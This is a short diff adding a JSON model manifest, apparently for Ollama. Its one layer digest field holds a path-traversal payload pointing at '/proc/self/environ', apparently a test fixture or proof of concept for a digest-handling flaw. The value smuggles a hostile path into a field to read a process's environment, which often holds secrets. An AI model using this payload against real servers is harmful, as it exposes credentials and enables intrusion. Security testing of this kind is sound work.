@@ -1,0 +1,9 @@
+{
+  "name": "custom-audit-model",
+  "layers": [
+    {
+      "digest": "sha256:../../../../../../../../proc/self/environ",
+      "mediaType": "application/vnd.ollama.image.model"
+    }
+  ]
+}
